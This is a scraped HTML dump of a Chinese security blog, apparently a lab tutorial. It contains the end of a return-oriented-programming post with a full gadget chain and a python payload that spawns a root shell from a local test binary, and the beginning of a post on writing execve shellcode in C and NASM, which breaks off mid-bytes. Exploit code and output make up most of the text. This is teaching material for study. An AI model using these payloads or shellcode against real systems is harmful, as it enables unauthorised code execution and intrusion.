class=\"highlight less\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">root<span class=\"variable\">@kali:</span>~/Desktop/tuts/so# objdump -D rop2 | grep data</div><div class=\"line\">Disassembly of section .<span class=\"attribute\">rodata</span>:</div><div class=\"line\">Disassembly of section .<span class=\"attribute\">data</span>:</div><div class=\"line\"><span class=\"number\">080496</span>fc &lt;__data_start&gt;:</div></pre></td></tr></table></figure></p>\n<p>.data 的其实地址为 “0x080496fc”。<br>也可在 gdb 中使用 “info files” 命令查看。</p>\n<figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\">(gdb) info files</div><div class=\"line\">Symbols <span class=\"keyword\">from</span> <span class=\"string\">\"/root/Desktop/tuts/so/rop2\"</span>.</div><div class=\"line\">Unix child process:</div><div class=\"line\">Using <span class=\"keyword\">the</span> <span class=\"built_in\">running</span> image <span class=\"keyword\">of</span> child process <span class=\"number\">28344.</span></div><div class=\"line\">While <span class=\"built_in\">running</span> this, GDB <span class=\"keyword\">does</span> <span class=\"keyword\">not</span> access memory <span class=\"keyword\">from</span>...</div><div class=\"line\">Local exec <span class=\"built_in\">file</span>:</div><div class=\"line\">`/root/Desktop/tuts/so/rop2', <span class=\"built_in\">file</span> type elf32-i386.</div><div class=\"line\">Entry point: <span class=\"number\">0x8048390</span></div><div class=\"line\"><span class=\"number\">0x08048134</span> - <span class=\"number\">0x08048147</span> <span class=\"keyword\">is</span> .interp</div><div class=\"line\"><span class=\"comment\">---snipped---</span></div><div class=\"line\"><span class=\"number\">0x080496d8</span> - <span class=\"number\">0x080496dc</span> <span class=\"keyword\">is</span> .got</div><div class=\"line\"><span class=\"number\">0x080496dc</span> - <span class=\"number\">0x080496fc</span> <span class=\"keyword\">is</span> .got.plt</div><div class=\"line\"><span class=\"number\">0x080496fc</span> - <span class=\"number\">0x08049704</span> <span class=\"keyword\">is</span> .data</div><div class=\"line\"><span class=\"comment\">---snipped---</span></div><div class=\"line\">(gdb)</div></pre></td></tr></table></figure>\n<p>问题：本想使用 .data + 4 和 .data + 8 存放字符串。但是 .data + 8 = 0x080496fc+4 =0x08049700，shellcode中不应出现 NULL，会截断shellcode，因此另选地址 0x08049704 存放字符串。</p>\n<p>现在要做的是，将 “/bin/sh” 存放在 0x08049704 处。</p>\n<p>需要将 “/bin/sh” 以 4 byte 为单位分割成两部分 “/bin” 、”/sh”，但是 “/sh” 只有 3 byte，最后 1 byte 就会自动填充成 NULL，这是不允许的。因此在最前面增加一个 /，即 “//sh”，最后的字符串为 “/bin//sh”。</p>\n<p>将 “/bin” 和 “//sh” 分别放在刚才选定的地址 0x08049704 和 0x08049704 + 4 处。即调用 “mov [r32],r32;ret”指令序列。但首先需调用 “pop r32;ret” 指令序列将字符串 “/bin” 和 “//sh” 存放在 r32 中。</p>\n<p><strong>（2） 寻找 mov 指令。</strong><br><figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">ROPeMe&gt; search <span class=\"keyword\">mov</span> [ <span class=\"built_in\">eax</span> %</div><div class=\"line\">---snipped---</div><div class=\"line\">0x29ecfL: <span class=\"keyword\">mov</span> [<span class=\"built_in\">eax</span>] <span class=\"built_in\">ecx</span> <span class=\"comment\">;;</span></div></pre></td></tr></table></figure></p>\n<p>mov [eax] ecx ：将 ecx 中的值存放到 eax中的地址指向的内存区。<br>找到的 mov 指令的实际地址为 :<br><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">0x29e</span>xf+<span class=\"number\">0xb7e63000</span> = <span class=\"number\">0xB7E8CECF</span></div></pre></td></tr></table></figure></p>\n<p>那么在执行这个 gadget 之前，需先调用 “pop eax;ret” “pop ecx;ret” 设置eax，ecx的值，eax 为刚找的内存地址 0x08049704 ，ecx 为字符串。</p>\n<p><strong>（3）查找 pop 指令序列</strong><br><figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">ROPeMe&gt; search <span class=\"keyword\">pop</span> <span class=\"built_in\">ecx</span> %</div><div class=\"line\">Searching for ROP gadget: <span class=\"keyword\">pop</span> <span class=\"built_in\">ecx</span> % with constraints: []</div><div class=\"line\">0x3ca61L: <span class=\"keyword\">pop</span> <span class=\"built_in\">ecx</span> <span class=\"comment\">; add ecx 0xa ; mov [edx] ecx ;;</span></div><div class=\"line\">0xd8f30L: <span class=\"keyword\">pop</span> <span class=\"built_in\">ecx</span> <span class=\"comment\">; pop eax ;;</span></div><div class=\"line\">0xd8f51L: <span class=\"keyword\">pop</span> <span class=\"built_in\">ecx</span> <span class=\"comment\">; pop eax ;;</span></div><div class=\"line\">0xe2c02L: <span class=\"keyword\">pop</span> <span class=\"built_in\">ecx</span> <span class=\"comment\">; pop ebx ;;</span></div><div class=\"line\">0x2a6ebL: <span class=\"keyword\">pop</span> <span class=\"built_in\">ecx</span> <span class=\"comment\">; pop edx ;;</span></div><div class=\"line\">ROPeMe&gt;</div></pre></td></tr></table></figure></p>\n<p>一个指令序列 “pop ecx;pop eax;;” 就可以一次设置 eax ecx 的值。<br>地址 ： 0xd8f30+0xb7e63000 = 0xB7F3BF30</p>\n<p>接下来需要向内存中写入 NULL，但要时刻记住，shellcode中不能出现 NULL。<br>因为首先清零一个寄存器 r32_1，然后是用 mov [r32_2] ,r32_1;ret 指令将 0 放入内存中。</p>\n<p>之前我们找到了 “xor eax,eax;ret” gadget，现在只需找 “mov r[32],eax;ret” gadget</p>\n<figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">ROPeMe&gt; search <span class=\"keyword\">mov</span> % <span class=\"built_in\">eax</span></div><div class=\"line\">Searching for ROP gadget: <span class=\"keyword\">mov</span> % <span class=\"built_in\">eax</span> with constraints: []</div><div class=\"line\">0xf0cffL: <span class=\"keyword\">mov</span> [<span class=\"number\">0x810001e9</span>] <span class=\"built_in\">eax</span> <span class=\"comment\">;;</span></div><div class=\"line\">0xdc5ffL: <span class=\"keyword\">mov</span> [<span class=\"number\">0x81000330</span>] <span class=\"built_in\">eax</span> <span class=\"comment\">;;</span></div><div class=\"line\">0x2a71cL: <span class=\"keyword\">mov</span> [<span class=\"built_in\">edx</span>+<span class=\"number\">0x14</span>] <span class=\"built_in\">ecx</span> <span class=\"comment\">; mov [edx+0xc] ebp ; mov [edx+0x18] eax ;;</span></div><div class=\"line\">0x2a722L: <span class=\"keyword\">mov</span> [<span class=\"built_in\">edx</span>+<span class=\"number\">0x18</span>] <span class=\"built_in\">eax</span> <span class=\"comment\">;;</span></div></pre></td></tr></table></figure>\n<p>mov [edx+0x18] eax ;;    将 eax 的内容 存放在 edx + 0x18 指向的内存区。<br>地址 ： 0x2a722+0xb7e63000 = 0xB7E8D722</p>\n<p>现在需要 “pop ebx” , “pop ecx” , “pop edx” 加载相应的参数到相应的寄存器。</p>\n<figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">0x78af4L: <span class=\"keyword\">pop</span> <span class=\"built_in\">ebx</span> <span class=\"comment\">;; 0x78af4+0xb7e63000 = 0xB7EDBAF4</span></div><div class=\"line\">0x2a6ebL: <span class=\"keyword\">pop</span> <span class=\"built_in\">ecx</span> <span class=\"comment\">; pop edx ;; 0x2a6eb+0xb7e63000 = 0xB7E8D6EB</span></div></pre></td></tr></table></figure>\n<p>寻找 将系统调用号 放入 eax 的gadget。<br>之前 eax 清零了，使用 算术运算 就可以了</p>\n<figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">0x7faa8L: <span class=\"keyword\">add</span> <span class=\"built_in\">eax</span> <span class=\"number\">0xb</span> <span class=\"comment\">;; 0x7faa8+0xb7e63000 = 0xB7EE2AA8</span></div></pre></td></tr></table></figure>\n<p><strong>（4）最后一个 gadget 即执行系统调用指令</strong><br>但是我们没有找到 int 0x80 指令，但是找到了内核系统调用指令 call gd:[0x10]</p>\n<figure class=\"highlight go\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">0xa10f</span>5L: call gs:[<span class=\"number\">0x10</span>] ;; <span class=\"number\">0xa10f</span>5 + <span class=\"number\">0xb7e63000</span> = <span class=\"number\">0xB7F040F5</span></div></pre></td></tr></table></figure>\n<p>OK，找到了组成 exploit 的所有gadget<br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1f27454szgfj30ks0a8gnf.jpg\" alt=\"\"></p>\n<p>选取的内存地址为 “0x08049704”</p>\n<h2 id=\"③-ROP-链如下\"><a href=\"#③-ROP-链如下\" class=\"headerlink\" title=\"③ ROP 链如下:\"></a>③ ROP 链如下:</h2><figure class=\"highlight smali\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">pop ecx; pop eax;;ret + “/bin”+ address to write to --&gt; mov [eax],ecx; ret --&gt;<span class=\"built_in\"> xor </span>eax,eax;ret --&gt; </div><div class=\"line\">pop edx;ret --&gt; address to write too – 18 --&gt;  mov [edx+18],eax;ret --&gt; </div><div class=\"line\">pop ecx;pop edx; ret + address of argp<span class=\"built_in\"> array </span>+ address of envp<span class=\"built_in\"> array </span>--&gt; </div><div class=\"line\">pop ebx;ret + address of string “/bin//sh”  --&gt;<span class=\"built_in\"> add </span>eax,0xb;ret --&gt; call gs:[0x10].</div></pre></td></tr></table></figure>\n<p>输入的数据格式：<br><figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div></pre></td><td class=\"code\"><pre><div class=\"line\">“A”*<span class=\"number\">260</span></div><div class=\"line\">+ <span class=\"number\">0xB7F3BF30</span> <span class=\"keyword\">pop</span> <span class=\"built_in\">ecx</span> <span class=\"comment\">;     pop eax; ret</span></div><div class=\"line\">+ “/bin”                           string to be popped <span class=\"keyword\">into</span> <span class=\"built_in\">ecx</span></div><div class=\"line\">+ <span class=\"number\">0x08049704</span>                address to be popped <span class=\"keyword\">into</span> <span class=\"built_in\">eax</span> to write “/bin” to</div><div class=\"line\">+ <span class=\"number\">0xB7E8CECF</span> \t \t<span class=\"keyword\">mov</span> [<span class=\"built_in\">ecx</span>],<span class=\"built_in\">eax</span><span class=\"comment\">; ret</span></div><div class=\"line\">+ <span class=\"number\">0xB7F3BF30</span> \t\t<span class=\"keyword\">pop</span> <span class=\"built_in\">ecx</span> <span class=\"comment\">; pop eax; ret</span></div><div class=\"line\">+ “//sh” \t\t                 string to be popped <span class=\"keyword\">into</span> <span class=\"built_in\">ecx</span></div><div class=\"line\">+ <span class=\"number\">0x08049708</span> \t\taddress to be popped <span class=\"keyword\">into</span> <span class=\"built_in\">eax</span> to write “//sh” to “<span class=\"number\">0x0804971c</span> +<span class=\"number\">4</span>”</div><div class=\"line\">+ <span class=\"number\">0xB7E8CECF</span> \t\t<span class=\"keyword\">mov</span> [<span class=\"built_in\">ecx</span>],<span class=\"built_in\">eax</span><span class=\"comment\">; ret</span></div><div class=\"line\">+ <span class=\"number\">0xB7EDC6BF</span> \t\t<span class=\"keyword\">xor</span> <span class=\"built_in\">eax</span>,<span class=\"built_in\">eax</span><span class=\"comment\">; ret</span></div><div class=\"line\">+ <span class=\"number\">0xB7E64A9E</span> \t\t<span class=\"keyword\">pop</span> <span class=\"built_in\">edx</span><span class=\"comment\">;ret</span></div><div class=\"line\">+ <span class=\"number\">0x080496f4</span> \t\t        address to write NULL bytes to “<span class=\"number\">0x08049708</span>+<span class=\"number\">4</span>-<span class=\"number\">18</span>”</div><div class=\"line\">+ <span class=\"number\">0xB7E8D722</span> \t\t<span class=\"keyword\">mov</span> [<span class=\"built_in\">edx</span>+<span class=\"number\">0x18</span>] <span class=\"built_in\">eax</span> <span class=\"comment\">;ret</span></div><div class=\"line\">+ <span class=\"number\">0xB7E8D6EB</span> \t\t<span class=\"keyword\">pop</span> <span class=\"built_in\">ecx</span><span class=\"comment\">; pop edx; ret</span></div><div class=\"line\">+ <span class=\"number\">0x08049712</span> \t\taddress of argp array to be loaded <span class=\"keyword\">into</span> <span class=\"built_in\">ecx</span> pointing to NULL bytes.</div><div class=\"line\">+ <span class=\"number\">0x08049712</span> \t\taddress of envp array to be loaded <span class=\"keyword\">into</span> <span class=\"built_in\">edx</span> pointing to NULL bytes.</div><div class=\"line\">+ <span class=\"number\">0xB7EDBAF4</span> \t\t<span class=\"keyword\">pop</span> <span class=\"built_in\">ebx</span> <span class=\"comment\">; ret</span></div><div class=\"line\">+ <span class=\"number\">0x08049704</span> \t\tpointer of string “/bin//sh”</div><div class=\"line\">+ <span class=\"number\">0xB7EE2AA8</span> \t\t<span class=\"keyword\">add</span> <span class=\"built_in\">eax</span> <span class=\"number\">0xb</span> <span class=\"comment\">;ret</span></div><div class=\"line\">+ <span class=\"number\">0xB7F040F5</span> \t\t<span class=\"keyword\">call</span> <span class=\"built_in\">gs</span>:[<span class=\"number\">0x10</span>] <span class=\"comment\">; ret</span></div></pre></td></tr></table></figure></p>\n<p>一般都是小端存储，需要转换为小端存储格式<br><figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">./rop2 `python -c 'print \"A\"*260 +\"<span class=\"symbol\">\\x</span>30<span class=\"symbol\">\\x</span>bf<span class=\"symbol\">\\x</span>f3<span class=\"symbol\">\\x</span>b7\"+\"/bin\"+\"<span class=\"symbol\">\\x</span>04<span class=\"symbol\">\\x</span>97<span class=\"symbol\">\\x</span>04<span class=\"symbol\">\\x</span>08\"+\"<span class=\"symbol\">\\x</span>cf<span class=\"symbol\">\\x</span>ce<span class=\"symbol\">\\x</span>e8<span class=\"symbol\">\\x</span>b7\"+\"<span class=\"symbol\">\\x</span>30<span class=\"symbol\">\\x</span>bf<span class=\"symbol\">\\x</span>f3<span class=\"symbol\">\\x</span>b7\"+\"//sh\"+\"<span class=\"symbol\">\\x</span>08<span class=\"symbol\">\\x</span>97<span class=\"symbol\">\\x</span>04<span class=\"symbol\">\\x</span>08\"+\"<span class=\"symbol\">\\x</span>cf<span class=\"symbol\">\\x</span>ce<span class=\"symbol\">\\x</span>e8<span class=\"symbol\">\\x</span>b7\"+\"<span class=\"symbol\">\\x</span>bf<span class=\"symbol\">\\x</span>c6<span class=\"symbol\">\\x</span>ed<span class=\"symbol\">\\x</span>b7\"+\"<span class=\"symbol\">\\x</span>9e<span class=\"symbol\">\\x</span>4a<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>b7\"+\"<span class=\"symbol\">\\x</span>f4<span class=\"symbol\">\\x</span>96<span class=\"symbol\">\\x</span>04<span class=\"symbol\">\\x</span>08\"+\"<span class=\"symbol\">\\x</span>22<span class=\"symbol\">\\x</span>d7<span class=\"symbol\">\\x</span>e8<span class=\"symbol\">\\x</span>b7\"+\"<span class=\"symbol\">\\x</span>eb<span class=\"symbol\">\\x</span>d6<span class=\"symbol\">\\x</span>e8<span class=\"symbol\">\\x</span>b7\"+\"<span class=\"symbol\">\\x</span>12<span class=\"symbol\">\\x</span>97<span class=\"symbol\">\\x</span>04<span class=\"symbol\">\\x</span>08\"+\"<span class=\"symbol\">\\x</span>12<span class=\"symbol\">\\x</span>97<span class=\"symbol\">\\x</span>04<span class=\"symbol\">\\x</span>08\"+\"<span class=\"symbol\">\\x</span>f4<span class=\"symbol\">\\x</span>ba<span class=\"symbol\">\\x</span>ed<span class=\"symbol\">\\x</span>b7\"+\"<span class=\"symbol\">\\x</span>04<span class=\"symbol\">\\x</span>97<span class=\"symbol\">\\x</span>04<span class=\"symbol\">\\x</span>08\"+\"<span class=\"symbol\">\\x</span>a8<span class=\"symbol\">\\x</span>2a<span class=\"symbol\">\\x</span>ee<span class=\"symbol\">\\x</span>b7\"+\"<span class=\"symbol\">\\x</span>f5<span class=\"symbol\">\\x</span>40<span class=\"symbol\">\\x</span>f0<span class=\"symbol\">\\x</span>b7\"'`</div></pre></td></tr></table></figure></p>\n<h2 id=\"④-测试一下-shellcode-正确性和实用性\"><a href=\"#④-测试一下-shellcode-正确性和实用性\" class=\"headerlink\" title=\"④ 测试一下 shellcode 正确性和实用性\"></a>④ 测试一下 shellcode 正确性和实用性</h2><figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">root@kali:~/Desktop/tuts/so# ./rop2 `python -c 'print \"A\"*260 +\"<span class=\"symbol\">\\x</span>30<span class=\"symbol\">\\x</span>bf<span class=\"symbol\">\\x</span>f3<span class=\"symbol\">\\x</span>b7\"+\"/bin\"+\"<span class=\"symbol\">\\x</span>04<span class=\"symbol\">\\x</span>97<span class=\"symbol\">\\x</span>04<span class=\"symbol\">\\x</span>08\"+\"<span class=\"symbol\">\\x</span>cf<span class=\"symbol\">\\x</span>ce<span class=\"symbol\">\\x</span>e8<span class=\"symbol\">\\x</span>b7\"+\"<span class=\"symbol\">\\x</span>30<span class=\"symbol\">\\x</span>bf<span class=\"symbol\">\\x</span>f3<span class=\"symbol\">\\x</span>b7\"+\"//sh\"+\"<span class=\"symbol\">\\x</span>08<span class=\"symbol\">\\x</span>97<span class=\"symbol\">\\x</span>04<span class=\"symbol\">\\x</span>08\"+\"<span class=\"symbol\">\\x</span>cf<span class=\"symbol\">\\x</span>ce<span class=\"symbol\">\\x</span>e8<span class=\"symbol\">\\x</span>b7\"+\"<span class=\"symbol\">\\x</span>bf<span class=\"symbol\">\\x</span>c6<span class=\"symbol\">\\x</span>ed<span class=\"symbol\">\\x</span>b7\"+\"<span class=\"symbol\">\\x</span>9e<span class=\"symbol\">\\x</span>4a<span class=\"symbol\">\\x</span>e6<span class=\"symbol\">\\x</span>b7\"+\"<span class=\"symbol\">\\x</span>f4<span class=\"symbol\">\\x</span>96<span class=\"symbol\">\\x</span>04<span class=\"symbol\">\\x</span>08\"+\"<span class=\"symbol\">\\x</span>22<span class=\"symbol\">\\x</span>d7<span class=\"symbol\">\\x</span>e8<span class=\"symbol\">\\x</span>b7\"+\"<span class=\"symbol\">\\x</span>eb<span class=\"symbol\">\\x</span>d6<span class=\"symbol\">\\x</span>e8<span class=\"symbol\">\\x</span>b7\"+\"<span class=\"symbol\">\\x</span>12<span class=\"symbol\">\\x</span>97<span class=\"symbol\">\\x</span>04<span class=\"symbol\">\\x</span>08\"+\"<span class=\"symbol\">\\x</span>12<span class=\"symbol\">\\x</span>97<span class=\"symbol\">\\x</span>04<span class=\"symbol\">\\x</span>08\"+\"<span class=\"symbol\">\\x</span>f4<span class=\"symbol\">\\x</span>ba<span class=\"symbol\">\\x</span>ed<span class=\"symbol\">\\x</span>b7\"+\"<span class=\"symbol\">\\x</span>04<span class=\"symbol\">\\x</span>97<span class=\"symbol\">\\x</span>04<span class=\"symbol\">\\x</span>08\"+\"<span class=\"symbol\">\\x</span>a8<span class=\"symbol\">\\x</span>2a<span class=\"symbol\">\\x</span>ee<span class=\"symbol\">\\x</span>b7\"+\"<span class=\"symbol\">\\x</span>f5<span class=\"symbol\">\\x</span>40<span class=\"symbol\">\\x</span>f0<span class=\"symbol\">\\x</span>b7\"'`</div><div class=\"line\"># id</div><div class=\"line\">uid=0(root) gid=0(root) groups=0(root)</div><div class=\"line\"># ls</div><div class=\"line\">ROPgadget a.out core g get getenv.c rop rop2 rop3 ropeme ropeme-bhus10 ropeme-bhus10.tar rt rt2 rt2.c s so so.c so2 so2.c so3.c wrpr wrpr.c</div><div class=\"line\">#</div></pre></td></tr></table></figure>\n<p>OK！！！ROP 链成功新建了一个 shell。</p>\n<h1 id=\"Ⅴ、参考文献\"><a href=\"#Ⅴ、参考文献\" class=\"headerlink\" title=\"Ⅴ、参考文献\"></a>Ⅴ、参考文献</h1><p><a href=\"https://www.exploit-db.com/docs/28479.pdf\" target=\"_blank\" rel=\"external\">Return-Oriented-Programming(ROP FTW)</a></p>\n"},{"title":"Linux 基本缓冲区溢出 shellcode 编写","url":"http://huirong.github.io/2016/03/10/Linux-shellcode/","content":"<p>有关shellcode定义不是很了解的请参见 <a href=\"http://huirong.github.io/2016/04/16/shellcodeAndExploit/\">shellcode 与 exploit</a><br><a id=\"more\"></a></p>\n<h1 id=\"1-shellcode-分析\"><a href=\"#1-shellcode-分析\" class=\"headerlink\" title=\"1 shellcode 分析\"></a>1 shellcode 分析</h1><h2 id=\"1-1-execve-系统调用\"><a href=\"#1-1-execve-系统调用\" class=\"headerlink\" title=\"1.1 execve()系统调用\"></a>1.1 execve()系统调用</h2><p>最基本的shellcode就是通过调用 execve() 新开一个shell。<br>C语言程序：<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>** argv)</span></span>&#123;</div><div class=\"line\">    <span class=\"keyword\">char</span>* name[<span class=\"number\">2</span>];</div><div class=\"line\">    name[<span class=\"number\">0</span>] = <span class=\"string\">\"/bin/sh\"</span>;</div><div class=\"line\">    name[<span class=\"number\">1</span>] = <span class=\"literal\">NULL</span>;</div><div class=\"line\">    execve(name[<span class=\"number\">0</span>], name, <span class=\"literal\">NULL</span>);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>编译：gcc -o shell shell.c<br>运行：./shell<br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCjw1f9zy112hgwj30jg0443zh.jpg\" alt=\"\"><br>新打开了一个shell。</p>\n<h2 id=\"1-2-分析\"><a href=\"#1-2-分析\" class=\"headerlink\" title=\"1.2 分析\"></a>1.2 分析</h2><p>execve(name[0], name, NULL);</p>\n<ul>\n<li>name[0]：/bin/sh 的地址</li>\n<li>name：以NULL结束的/bin/sh的地址的地址</li>\n<li>NULL</li>\n</ul>\n<p>Linux 系统调用的参数一般存放在 ebx,ecx,edx,esi,edi 寄存器中。<br>因此参数分布存放情况</p>\n<ul>\n<li>ebx: “/bin/sh” 的地址,且 “/bin/sh” 后跟着 NULL</li>\n<li>ecx: “/bin/sh” 的地址的地址，且 /bin/sh 的地址后跟着NULL</li>\n<li>edx: NULL</li>\n<li>eax: 系统调用号<br>  execve()的系统调用号是 “11” 或 “0xb”</li>\n</ul>\n<h1 id=\"2-编写-exploit\"><a href=\"#2-编写-exploit\" class=\"headerlink\" title=\"2 编写 exploit\"></a>2 编写 exploit</h1><h2 id=\"2-1-分析\"><a href=\"#2-1-分析\" class=\"headerlink\" title=\"2.1 分析\"></a>2.1 分析</h2><p>完成 execve() 系统调用，转化为汇编需要以下几步：</p>\n<ol>\n<li>将以NULL结尾的字符串”/bin//sh” <font color=\"orange\">push</font> 进栈</li>\n<li>在内存中有”/bin//sh”的地址，其后是一个 unsigned long 型的NULL值</li>\n<li>将0xb拷贝到寄存器EAX中(execve的系统调用号是0xb)</li>\n<li>将”/bin//sh”的地址 <font color=\"orange\">mov</font> 到寄存器EBX中</li>\n<li>将”/bin//sh”地址的地址 <font color=\"orange\">mov</font> 到寄存器ECX中</li>\n<li>将 NULL <font color=\"orange\">mov</font> 到寄存器EDX中</li>\n<li>执行中断指令int $0x80</li>\n</ol>\n<font color=\"red\">Tips：需要将 “/bin/sh” 以 4 byte 为单位分割成两部分 “/bin” 、”/sh”，但是 “/sh” 只有 3 byte，最后 1 byte 就会自动填充成 NULL，这是不允许的。因此在最前面增加一个 /，即 “//sh”，最后的字符串为 “/bin//sh”。</font>\n\n<h2 id=\"2-2-汇编\"><a href=\"#2-2-汇编\" class=\"headerlink\" title=\"2.2 汇编\"></a>2.2 汇编</h2><p>对应的汇编程序 shellcode_execve.asm<br><figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">section</span> .text</div><div class=\"line\"><span class=\"meta\">global</span> _start</div><div class=\"line\"><span class=\"symbol\">_start:</span></div><div class=\"line\">    <span class=\"keyword\">xor</span> <span class=\"built_in\">eax</span>,<span class=\"built_in\">eax</span></div><div class=\"line\">    <span class=\"keyword\">push</span> <span class=\"built_in\">eax</span>               <span class=\"comment\">;NULL入栈</span></div><div class=\"line\">    <span class=\"keyword\">push</span> <span class=\"number\">0x68732f2f</span>    <span class=\"comment\">;0x68732f2f 即为//sh 的ASCII编码,注意大小端，将//sh入栈</span></div><div class=\"line\">    <span class=\"keyword\">push</span> <span class=\"number\">0x6e69622f</span>    <span class=\"comment\">;0x6e69622f 即为/bin 的ASCII编码，将 /bin 入栈</span></div><div class=\"line\">    <span class=\"keyword\">mov</span> <span class=\"built_in\">ebx</span>,<span class=\"built_in\">esp</span>          <span class=\"comment\">;此时 esp 指向栈顶，即保存 以NULL结尾的\"/bin//sh\"，将此地址保存到 ebx 中</span></div><div class=\"line\">    <span class=\"keyword\">push</span> <span class=\"built_in\">eax</span>               <span class=\"comment\">; NULL 入栈</span></div><div class=\"line\">    <span class=\"keyword\">push</span> <span class=\"built_in\">ebx</span>               <span class=\"comment\">;以NULL结尾的\"/bin//sh\" 的地址入栈</span></div><div class=\"line\">    <span class=\"keyword\">mov</span> <span class=\"built_in\">ecx</span>,<span class=\"built_in\">esp</span>          <span class=\"comment\">;\"/bin//sh\" 的地址的地址放入ecx，且 /bin//sh 的地址后跟着NULL</span></div><div class=\"line\">    <span class=\"keyword\">xor</span> <span class=\"built_in\">edx</span>,<span class=\"built_in\">edx</span>           <span class=\"comment\">; NULL 放置到 edx</span></div><div class=\"line\">    <span class=\"keyword\">mov</span> <span class=\"built_in\">al</span>,<span class=\"number\">0xb</span>            <span class=\"comment\">; execve()系统调用号 11 存放到 eax 中</span></div><div class=\"line\">    <span class=\"keyword\">int</span> <span class=\"number\">0x80</span></div></pre></td></tr></table></figure></p>\n<p>编译：nasm -f elf shellcode_execve.asm -o shellcode_execve.o<br>连接：ld -o shellcode_execve shellcode_execve.o<br>运行：./shellcode_execve </p>\n<p><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCgw1f9zytwty6yj30k3020gmf.jpg\" alt=\"\"></p>\n<h2 id=\"2-3-提出二进制码\"><a href=\"#2-3-提出二进制码\" class=\"headerlink\" title=\"2.3 提出二进制码\"></a>2.3 提出二进制码</h2><p>使用 objdump 提取二进制码：</p>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1f9zywv42rjj30jg09kq5w.jpg\" alt=\"\"></p>\n<p>exploit 为<br><figure class=\"highlight taggerscript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">\"<span class=\"symbol\">\\x</span>31<span class=\"symbol\">\\x</span>c0<span class=\"symbol\">\\x</span>50<span class=\"symbol\">\\x</span>68<span class=\"symbol\">\\x</span>2f<span class=\"symbol\">\\x</span>2f<span 